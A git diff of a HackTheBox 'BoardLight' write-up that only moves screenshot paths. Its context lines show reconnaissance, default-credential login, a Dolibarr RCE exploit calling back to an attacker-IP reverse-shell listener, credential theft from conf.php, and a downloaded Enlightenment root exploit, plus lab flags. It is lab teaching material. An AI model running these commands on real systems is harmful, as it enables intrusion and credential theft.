@@ -40,7 +40,7 @@ Check if the host is alive using ICMP:
 ping -c 1 10.129.231.37
 ```
 
-![ping](boardlight_01_ping.png)
+![ping](screenshots/boardlight_01_ping.png)
 
 ---
 ### 1.2 Port Scanning
@@ -58,7 +58,7 @@ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.231.37 -oG allPorts
 - `-Pn` : Skip host discovery  
 - `-oG` : Output in grepable format  
 
-![allports](boardlight_02_nmap_allports.png)
+![allports](screenshots/boardlight_02_nmap_allports.png)
 
 Extract the open ports:
 
@@ -66,7 +66,7 @@ Extract the open ports:
 extractPorts allPorts
 ```
 
-![extractports](boardlight_03_extractports.png)
+![extractports](screenshots/boardlight_03_extractports.png)
 
 ---
 ### 1.3 Targeted Scan
@@ -82,7 +82,7 @@ cat targeted
 - `-sV` : Detect service versions  
 - `-oN` : Output in human-readable format  
 
-![targeted](boardlight_04_nmap_targeted.png)
+![targeted](screenshots/boardlight_04_nmap_targeted.png)
 
 **Findings:**
 
@@ -102,7 +102,7 @@ With HTTP exposed on port 80, I fingerprinted the site to look for technology hi
 whatweb http://10.129.231.37
 ```
 
-![whatweb](boardlight_05_whatweb.png)
+![whatweb](screenshots/boardlight_05_whatweb.png)
 
 The output contained a `board.htb` hint, so I mapped it locally:
 
@@ -110,7 +110,7 @@ The output contained a `board.htb` hint, so I mapped it locally:
 echo "10.129.231.37 board.htb" | sudo tee -a /etc/hosts
 ```
 
-![hosts](boardlight_06_hosts_board_htb.png)
+![hosts](screenshots/boardlight_06_hosts_board_htb.png)
 
 ---
 ### 2.2 Content/VHost Discovery
@@ -121,11 +121,11 @@ The landing page itself looked mostly static, so I ran content discovery to see 
 ffuf -u http://10.129.231.37/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -ac -fc 404 -t 40
 ```
 
-![ffuf-content](boardlight_07_ffuf_content.png)
+![ffuf-content](screenshots/boardlight_07_ffuf_content.png)
 
 From here, the key pivot was identifying a CRM vhost (`crm.board.htb`) hosting the real application (Dolibarr):
 
-![dolibarr-login](boardlight_08_dolibarr_login.png)
+![dolibarr-login](screenshots/boardlight_08_dolibarr_login.png)
 
 ---
 ## 3. Foothold
@@ -136,7 +136,7 @@ The `crm.board.htb` site presented a Dolibarr 17.0.0 login page. Default credent
 
 **Recovered:** `admin:admin`
 
-![dolibarr-admin](boardlight_09_dolibarr_admin_access_denied.png)
+![dolibarr-admin](screenshots/boardlight_09_dolibarr_admin_access_denied.png)
 
 ---
 ### 3.2 Authenticated RCE (CVE-2023-30253) â†’ `www-data` shell
@@ -148,11 +148,11 @@ python3 exploit.py http://crm.board.htb admin admin 10.10.15.206 4444
 nc -lvnp 4444
 ```
 
-![rce-shell](boardlight_10_cve_2023_30253_shell.png)
+![rce-shell](screenshots/boardlight_10_cve_2023_30253_shell.png)
 
 Once connected, I confirmed I was running as the web user and started enumerating the webroot for credentials:
 
-![wwwdata-enum](boardlight_11_wwwdata_enum_paths.png)
+![wwwdata-enum](screenshots/boardlight_11_wwwdata_enum_paths.png)
 
 ---
 ### 3.3 Credential discovery in `conf.php`
@@ -164,7 +164,7 @@ cd /var/www/html/crm.board.htb/htdocs/conf
 cat conf.php
 ```
 
-![conf-php](boardlight_12_conf_php_db_creds.png)
+![conf-php](screenshots/boardlight_12_conf_php_db_creds.png)
 
 **Recovered:** `dolibarrowner:serverfun2$2023!!`
 
@@ -178,7 +178,7 @@ ssh larissa@crm.board.htb
 cat ~/user.txt
 ```
 
-![user-flag](boardlight_13_ssh_larissa_user_flag.png)
+![user-flag](screenshots/boardlight_13_ssh_larissa_user_flag.png)
 
 ðŸ **User flag obtained**: `ab7c93d89c67d44f0ec795b12e3a92f4`
 
@@ -193,7 +193,7 @@ I first checked for simple sudo misconfigurations:
 sudo -l
 ```
 
-![sudo-l](boardlight_14_sudo_l.png)
+![sudo-l](screenshots/boardlight_14_sudo_l.png)
 
 With no sudo rights, I enumerated SUID binaries and file capabilities to find unusual privilege boundaries:
 
@@ -204,7 +204,7 @@ find / -perm -4000 -type f 2>/dev/null
 getcap -r / 2>/dev/null
 ```
 
-![suid-getcap](boardlight_15_suid_getcap.png)
+![suid-getcap](screenshots/boardlight_15_suid_getcap.png)
 
 This stood out because several Enlightenment-related helpers were installed as SUID root, including `enlightenment_sys`:
 
@@ -213,7 +213,7 @@ enlightenment --version 2>/dev/null | head -n 30
 ls -la /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
 ```
 
-![enlightenment-version](boardlight_16_enlightenment_version_suid.png)
+![enlightenment-version](screenshots/boardlight_16_enlightenment_version_suid.png)
 
 ---
 ### 4.2 Root via Enlightenment SUID helper (CVE-2022-37706)
@@ -225,7 +225,7 @@ curl -fsSL -o exploit.sh "https://raw.githubusercontent.com/MaherAzzouzi/CVE-202
 scp exploit.sh larissa@crm.board.htb:/tmp/exploit.sh
 ```
 
-![transfer-exploit](boardlight_17_transfer_exploit.png)
+![transfer-exploit](screenshots/boardlight_17_transfer_exploit.png)
 
 Then I executed it on the target to obtain a root shell and retrieve the root flag:
 
@@ -237,7 +237,7 @@ whoami
 cat /root/root.txt
 ```
 
-![root-flag](boardlight_18_root_shell_root_flag.png)
+![root-flag](screenshots/boardlight_18_root_shell_root_flag.png)
 
 ðŸ **Root flag obtained**: `ba794719088d3d8f3e46679abe7d1b26`
 
